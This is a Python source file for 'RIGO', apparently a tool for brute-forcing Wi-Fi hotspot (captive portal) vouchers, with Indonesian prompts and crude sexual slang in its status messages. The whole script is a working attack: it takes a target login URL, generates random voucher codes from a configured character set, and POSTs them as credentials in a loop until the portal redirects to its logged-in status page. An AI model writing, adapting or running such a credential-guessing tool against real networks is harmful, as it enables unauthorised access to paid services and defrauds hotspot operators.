# IMPORT MODULE
import requests as req
import urllib.request as ul
import urllib.error as er
from urllib.parse import urlparse
import random,time,os,sys,configparser

# GET SETTINGS DATA
read = configparser.ConfigParser()
read.read('settings.ini')
debugMode = read['rigo']['debugMode']
digit = read['rigo']['voucherDigitNumber']
nt = read['rigo']['nomorTogel']
loginPage = read['rigo']['loginPage']
statusPage = read['rigo']['statusPage']
maxLogin = read['rigo']['maxLogin']

# Self Making with ❤ by Ubaii ID
# Thanks to : stackoverflow, My Family, Allah.

# COLOR LIBRARY
class c:
	purple = '\033[95m'
	ob = '\033[94m'
	oc = '\033[96m'
	og = '\033[92m'
	warn = '\033[93m'
	error = '\033[91m'
	n = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

def cls():
	command = 'clear'
	if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
		command = 'cls'
	os.system(command)

def banner():
	cls()
	print(f'''{c.og}
		RIGO
 =-------------------------------=
 SIMPLE BRUTEFORCE VOUCHER HOTSPOT
 =-------------------------------={c.oc}
 Version : 1.0
 github.com/ubaii/rigo{c.n}''')

def validating(target):
	data = urlparse(target)
	path = data.path
	cek = data.scheme
	if cek == '':
		return False
	elif path == '':
		return False
	else:
		return True

def redirectCheck(target, loginPage, statusPage):
	resp = ul.urlopen(target, timeout=2)
	if resp.geturl() == target+loginPage:
		return 'OK'
	elif resp.geturl() == target+statusPage:
		return 'DL'
	else:
		return resp.geturl()

def udpMode(loginPage, statusPage, maxLogin):
	banner()
	print(f'''
 [{c.ob}-{c.n}] MODE : Username & Password
 [{c.ob}-{c.n}] Silahkan masukkan url target.
 [{c.ob}-{c.n}] contoh huruf keberuntungan : mres.
 [{c.error}!{c.n}] Harap gunakan HTTP/HTTPS dan "/" dibelakang.
	''')
	target = input(f' [{c.ob}~{c.n}] URL Target ~> ')
	lucky = input(f' [{c.ob}~{c.n}] Huruf Keberuntungan ~> ')
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					read = configparser.ConfigParser()
					read.read('settings.ini')
					digit = read['rigo']['voucherDigitNumber']
					nt = read['rigo']['nomorTogel']
					rand = ''
					for i in range(0,int(digit)):
						rand+= random.choice(nt)
					data = {'username': lucky, 'password': rand}
					x = req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] crott -> [{lucky} & {rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def uspMode(loginPage, statusPage, maxLogin):
	banner()
	print(f'''
 [{c.ob}-{c.n}] MODE : Username = Password
 [{c.ob}-{c.n}] Silahkan masukkan url target.
 [{c.error}!{c.n}] Harap gunakan HTTP/HTTPS dan diakhiri dengan tanda "/"
	''')
	target = input(f' [{c.ob}~{c.n}] URL Target ~> ')
	target_validate = validating(target)
	targets = target+loginPage
	if target_validate is True:
		target_status = ul.urlopen(target).getcode()
		url_alive = target_status == 200
		if url_alive is True:
			t_end = time.time() + 2 * int(maxLogin)
			while time.time() < t_end:
				redirectValidate = redirectCheck(target,loginPage,statusPage)
				if redirectValidate == 'OK':
					rand = ''
					for i in range(0,int(digit)):
						rand+= random.choice(nt)
					data = {'username': rand, 'password': rand}
					x = req.post(targets, data = data)
					print(f' [{c.og}*{c.n}] crott -> [{rand}]')
				elif redirectValidate == 'DL':
					print(f' [{c.og}+{c.n}] Anda sudah hamil.')
					exit()
				else:
					print(f' [{c.error}!{c.n}] Tidak dapat melakukan pengencrotan')
					print(f' [{c.error}!{c.n}] Halaman terakhir : {redirectValidate}')
					exit()
		elif url_alive is False:
			print(f' [{c.error}!{c.n}] Url {target} tidak ditemukan.')
			print(f' [{c.error}!{c.n}] Pastikan anda telah terkoneksi ke jaringan hotspot.')
	elif target_validate is False:
		print(f' [{c.error}!{c.n}] Url {target} tidak valid.')
		print(f' [{c.error}!{c.n}] Pastikan menggunakan http/https dan diakhiri dengan tanda /.')
		exit()

def home(digit, nt, loginPage, statusPage, maxLogin):
	banner()
	print('''
 1. Username = Password Mode
 2. Username & Password Mode
	''')
	mode = int(input(f' [{c.ob}~{c.n}] Pilih Mode~> '))
	if mode == 1:
		uspMode(loginPage, statusPage, maxLogin)
	elif mode == 2:
		udpMode(loginPage, statusPage, maxLogin)

if __name__ == "__main__":
	if debugMode == 'false':
		try:
			home(digit, nt, loginPage, statusPage, maxLogin)
		except(SystemExit):
			print(f' [{c.error}!{c.n}] Pengencrotan selesai.')
		except(ValueError):
			print(f' [{c.error}!{c.n}] Kesalahan input.')
		except(KeyError):
			print(f' [{c.error}!{c.n}] Pastikan anda sudah menginstall seluruh module.')
		except(RecursionError):
			print(f' [{c.error}!{c.n}] Gagal ngehamilin bro:(')
		except(KeyboardInterrupt):
			print(f'\n [{c.error}!{c.n}] Keluar secara paksa.')
		except(er.URLError) as e:
			print(f'\n [{c.error}!{c.n}] Gagal menghubungkan ke target.')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah terhubung ke jaringan hotspot.')
		except(Exception) as e:
			print(f'\n [{c.error}!{c.n}] Kesalahan tidak diketahui.')
	else:
		try:
			home(digit, nt, loginPage, statusPage, maxLogin)
		except(SystemExit) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Pengencrotan selesai.')
		except(ValueError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Kesalahan input.')
		except(KeyError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah menginstall seluruh module.')
		except(RecursionError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f' [{c.error}!{c.n}] Gagal ngehamilin bro:(')
		except(KeyboardInterrupt) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Keluar secara paksa.')
		except(er.URLError) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Gagal menghubungkan ke target.')
			print(f' [{c.error}!{c.n}] Pastikan anda sudah terhubung ke jaringan hotspot.')
		except(Exception) as e:
			print(f' [{c.error}!{c.n}]{c.error} Error: {e}{c.n}')
			print(f'\n [{c.error}!{c.n}] Kesalahan tidak diketahui.')
